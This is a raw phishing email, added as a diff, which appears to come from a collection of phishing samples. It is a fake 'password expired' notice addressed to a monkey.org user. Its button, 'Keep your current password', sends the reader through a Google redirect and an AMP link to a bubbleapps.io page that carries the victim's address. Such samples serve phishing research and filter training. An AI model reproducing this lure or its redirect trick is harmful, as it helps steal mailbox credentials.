@@ -1,0 +1,135 @@
+Return-Path: w1784633109271_ftp_jd5oxjieormgx@lotusbali.co.jp
+Delivered-To: jose@monkey.org
+X-FDA: 82402382538.29.D5C466A
+Received: from wxpm07.wadax-sv.jp (wxpm07.wadax-sv.jp [157.120.115.25])
+	by imf15.b.hostedemail.com (Postfix) with ESMTP id 6018B6000C
+	for <jose@monkey.org>; Thu,  1 Aug 2024 04:23:27 +0000 (UTC)
+Authentication-Results: imf15.b.hostedemail.com;	dkim=pass
+ header.d=lotusbali.co.jp header.s=default header.b=U3sOOF1S;	dmarc=pass
+ (policy=quarantine) header.from=lotusbali.co.jp;	spf=pass
+ (imf15.b.hostedemail.com: domain of
+ w1784633109271_ftp_jd5oxjieormgx@lotusbali.co.jp designates 157.120.115.25 as
+ permitted sender)
+ smtp.mailfrom=w1784633109271_ftp_jd5oxjieormgx@lotusbali.co.jp
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1722486164; a=rsa-sha256;
+	cv=none;
+	b=zXfMzBM+tU2D2TzPX+fYmBHLBwxtePCJBbjf3+33J0nDc0otF8QOYWawg6uG9pev9us8l9
+	xIpF9V3KOmF8LuGVda0jNC7+VqtpP7SbrgUKnrps29j4VZnpySZkf3V2clBOQRATWNH2I+
+	c9qkmYbY1sUd1YIzHK0yuhzPE3akHWI=
+ARC-Authentication-Results: i=1;	imf15.b.hostedemail.com;	dkim=pass
+ header.d=lotusbali.co.jp header.s=default header.b=U3sOOF1S;	dmarc=pass
+ (policy=quarantine) header.from=lotusbali.co.jp;	spf=pass
+ (imf15.b.hostedemail.com: domain of
+ w1784633109271_ftp_jd5oxjieormgx@lotusbali.co.jp designates 157.120.115.25 as
+ permitted sender)
+ smtp.mailfrom=w1784633109271_ftp_jd5oxjieormgx@lotusbali.co.jp
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1722486164;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=IkinyHP2WNTZpF6olDZvXoe/IejsOiFBHQN2Nvu4clU=;
+	b=aZBd0YrGzOeTUrj6sZisbFbjSkKDij6uaAgPpUCQnbmnsFrpk9J+bDWzJLGtQDJzrZObvJ
+	b/I2Nz8AC9l+L94hExTtejy4q+2rw2ATNRnXFuIN0KEqrLGKFNfBbI0z3IxeG3H39uCUpX
+	gJRKwXoOu075B8oBAv3Jc+zzrwryTEE=
+Received: from wxpm07.wadax-sv.jp (localhost.localdomain [127.0.0.1])
+	by wxpm07.wadax-sv.jp (Proxmox) with ESMTP id 7A382581294
+	for <jose@monkey.org>; Thu,  1 Aug 2024 13:23:25 +0900 (JST)
+Received: from wx105.wadax-sv.jp (wx105.wadax-sv.jp [153.123.7.38])
+	by wxpm07.wadax-sv.jp (Proxmox) with ESMTPS id 08193581513
+	for <jose@monkey.org>; Thu,  1 Aug 2024 13:23:24 +0900 (JST)
+Received: by wx105.wadax-sv.jp (Postfix, from userid 10411)
+	id 02DD5E1DCE4DD; Thu,  1 Aug 2024 13:23:24 +0900 (JST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=lotusbali.co.jp;
+	s=default; t=1722486203;
+	bh=IkinyHP2WNTZpF6olDZvXoe/IejsOiFBHQN2Nvu4clU=; h=To:Subject:From;
+	b=U3sOOF1S0GJnBsw/AiAeLGanWyNtH3v/5jh4219TvsQq0iUXiywEKMPcrrBPmpIVZ
+	 RkyY5EJVSzi5BQJrKTbUM5gWBmKYN/ii6Il7qx7bm8iYag3kJjem3WJnf/gAuMaI0D
+	 Vj01oqjEUNiysgQSAoUM8/cyowi9rmLqo/28It0g=
+To: jose@monkey.org
+Subject: Monkey Final warning : Password Expired Notice
+From:  Monkey 07/31/2024 09:23:23 pm
+ <w1784633109271_ftp_jd5oxjieormgx@lotusbali.co.jp>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 8BIT
+Message-Id: <20240801042324.02DD5E1DCE4DD@wx105.wadax-sv.jp>
+Date: Thu,  1 Aug 2024 13:23:24 +0900 (JST)
+X-SPAM-LEVEL: Spam detection results:  6	AWL                    -0.039
+ Adjusted score from AWL reputation of From: address	BAYES_20              
+ -0.001 Bayes spam probability is 5 to 20%	DKIM_SIGNED               0.1
+ Message has a DKIM or DK signature, not necessarily valid	DKIM_VALID
+               -0.1 Message has at least one valid DKIM or DK signature
+	DKIM_VALID_AU            -0.1 Message has a valid DKIM or DK signature from
+ author's domain	DKIM_VALID_EF            -0.1 Message has a valid DKIM or DK
+ signature from envelope-from domain	FROM_EXCESS_BASE64      0.001 From:
+ base64 encoded unnecessarily	FROM_LOCAL_DIGITS       0.001 From: localpart
+ has long digit sequence	FROM_LOCAL_HEX          0.006 From: localpart has
+ long hexadecimal sequence	HTML_FONT_LOW_CONTRAST  0.001 HTML font color
+ similar or identical to background	HTML_MESSAGE            0.001 HTML
+ included in message	KAM_MAILBOX2             6.25 Mailbox Quota Phishing
+ Scams	MIME_HTML_ONLY            0.1 Message only has text/html MIME parts
+	RCVD_IN_VALIDITY_RPBL_BLOCKED  0.001 ADMINISTRATOR NOTICE: The query to
+ Validity was blocked.  See
+ https://knowledge.validity.com/hc/en-us/articles/20961730681243 for more
+ information.	RCVD_IN_VALIDITY_SAFE_BLOCKED  0.001 ADMINISTRATOR NOTICE: The
+ query to Validity was blocked.  See
+ https://knowledge.validity.com/hc/en-us/articles/20961730681243 for more
+ information.	SPF_HELO_PASS          -0.001 SPF: HELO matches SPF record
+	SPF_PASS               -0.001 SPF: sender matches SPF record	URIBL_BLOCKED
+           0.001 ADMINISTRATOR NOTICE: The query to URIBL was blocked.  See
+ http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block for more
+ information. [monkey.org,lotusbali.co.jp]
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 6018B6000C
+X-Stat-Signature: 18w3rgrxdpa95sa87qrqo4kgbn7kiso3
+X-Spam-Status: No, score=2.31
+X-Rspam-User: 
+X-HE-Tag: 1722486207-979583
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19F5PbzmOwubafcFvMZZolHcqYqkvHLp2JXG+Jjene61XZ?=
+ =?utf-8?q?iA7Xt8kV0VRW7CeNkjVW8/Qb9hondsFoKl12SARHmwQ+lNwfAI+ThQECqPIKeqJO8?=
+ =?utf-8?q?13sBPA3tON6us36Q08m04CvfY1hTkojN2Sn0pwIdc+37vwKsk+iaT6SKiLkgGiEYq?=
+ =?utf-8?q?LJ56jSZ9lWzqn/lg2MBlpNQNo6+ZmKWh4TZZn7JPgXY80vG4y2FBpacBJtSX7Xm9o?=
+ =?utf-8?q?zXf+/zTli3ja3z+ko6rXZDoqNRdoKd1Xh3kX+8KIkC1RYHkawxMf4cFL6X1XTSRHj?=
+ =?utf-8?q?O9llT20c/rpL9BkvmIa3RLq6V7UJovJxRV5rsmen0sMfqRD8Xa56fvX1LOzMHzXc1?=
+ =?utf-8?q?aayeFXz22MFbhTnIeXGBC/2YBVguB0DPXP465TnNFq2I/2Sv+AJ07k560QyD/LN/X?=
+ =?utf-8?q?+E/Vb+4TrafGQ/GCTDAOX8Og4IwsA3//wHfz5yLDvUxKefbKYkff504/QuFRGejsd?=
+ =?utf-8?q?reVgGVr1niKcCyUaOhExndvkYbs3fsPAgfzBWElkXpCoIgDNGgSvkX/NL3KjnFqr7?=
+ =?utf-8?q?UCADASoHcTSqCkQD2/nJyZCThVLKuY255mBJeTbS5eRzlOdHOeAiXii+CO1tYlCV6?=
+ =?utf-8?q?LJMIamx3S2Kz+acFsXn+O1bVZDfIB7lWtbZmnJoQ51ha/P2W6aF/iZvctVNMhXxLG?=
+ =?utf-8?q?+GXiFU01+II+bcz9KccvaJqK91slRXopwQNMHQoCLusOq4fXhLA8yuMpx1cxU511i?=
+ =?utf-8?q?3hcrFFEH0jtejM/pvkykR8brP6XQsw4PFzAJflxG+lrVCHRrpKnBY+67D1gvbYXcC?=
+ =?utf-8?q?bGfbXQcHEwbaNTF9B7WJQGDms7Q5CCGqvactz8FBUHd2hc3Eo+Jbzcmb6QgpVhn5+?=
+ =?utf-8?q?z7XwSrCVyCmSADURF14CcHA5nBitUmjIZ6aGwWYLntk7Bi/PkGHallRqbfSSjJWNr?=
+ =?utf-8?q?uIO4IB2P7C5sPiQqI2SzIC_0e5kfz/4Os5At0VXq0ZOzd06iNL3uah+h/+TLSzoZA?=
+ =?utf-8?q?osAG8LQPLyqffHEp3vH/E7sBZQrLEGuRN2lo9zFx0C0y1woolygiY7wCGFx8XHb6a?=
+ =?utf-8?q?ycfIuVmenSwOnB8OPyEZq/dmNiS9eTPfkjAHVBcutGbCtyhBfZAjavGu973uDiFAR?=
+ =?utf-8?q?RcdrWqvwnW7aebAqdI+UkTVwPQCaj4t+iqWboVd+UoO6kNYSzwCJHGZMQ9Rs6cf5V?=
+ =?utf-8?q?Lyp5+wt/+YJ3qMGpUqojBVfvVM7gDPAQu1IF1GtxZT1ggzLGz27TtnhZtICqr8SDu?=
+ =?utf-8?q?RNyLmGBjL2S64qqC1JK015XbkWVvnDWANowgraGLMiEYyV/W2LI4F/c+d0KvJ21zU?=
+ =?utf-8?q?u7tTDa7WCrRS8dxXqusaKZV5sGH7eZxFpsD9ShqN+fR/GM2EkCkLR6zEKh2tceaA4?=
+ =?utf-8?q?VhVCgpb7MROoP/WpSkK8N/EFlErmBrWECF1D6618y49cQLZz1CSEaw+QL76/UhZCo?=
+ =?utf-8?q?j2TgORf8odMyKh4OOVyg4/d4MI08VIjH28jN7f1zrZj2Q+Q35peUHQJKRbDD15F9n?=
+ =?utf-8?q?FGhe3FIXO2C+BnxlJagaWe92ddESXG5mwf/doJNWhgi8VT4tiwBUUeqjp/9HDM=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 221
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+</head>
+<body style="margin: 0.4em; font-size: 14pt;"><br class="Apple-interchange-newline">
+<table width="100%" role="module" style="color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; table-layout: fixed; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial;" border="0" 
+cellspacing="0" cellpadding="0"><tbody><tr><td height="100%" role="module-content" valign="top" style="margin: 0px; padding: 18px 0px; line-height: 22px;"><div><div style="text-align: center; font-family: inherit;">Hello jose@monkey.org</div><div style="text-align: center; font-family: inherit;"><br></div><div style="text-align: center; font-family: inherit;">Your Password expires soon&#12290;<br></div><div style="text-align: center; font-family: inherit;">
+Change password now or&nbsp;</div><div></div></div></td></tr></tbody></table>
+<table width="100%" role="module" style="color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; table-layout: fixed; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial;" border="0" 
+cellspacing="0" cellpadding="0"><tbody><tr><td align="center" style="margin: 0px; padding: 0px;"><table border="0" cellspacing="0" cellpadding="0"><tbody><tr><td align="center" style="margin: 0px; border-radius: 6px; text-align: center; font-size: 16px;" bgcolor="#0c70d3">
+<a style="padding: 12px 18px; border-radius: 2px; border: 1px solid rgb(12, 112, 211); color: rgb(255, 255, 255); line-height: normal; letter-spacing: 0px; font-size: 14px; display: inline-block; text-decoration-line: none;" href="https://www.google.com/url?q=//www.google.com.br/amp/s/yjog.bubbleapps.io/version-test#jose@monkey.org" target="_blank">Keep your current password</a></td></tr></tbody></table></td></tr></tbody></table>
+<table width="100%" role="module" style="color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; table-layout: fixed; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial;" border="0" 
+cellspacing="0" cellpadding="0"><tbody><tr><td height="100%" role="module-content" valign="top" style="margin: 0px; padding: 18px 0px; line-height: 22px;"><div><div style="text-align: center; font-family: inherit;">monkey.org</div></div></td></tr></tbody></table></body></html>
+
+
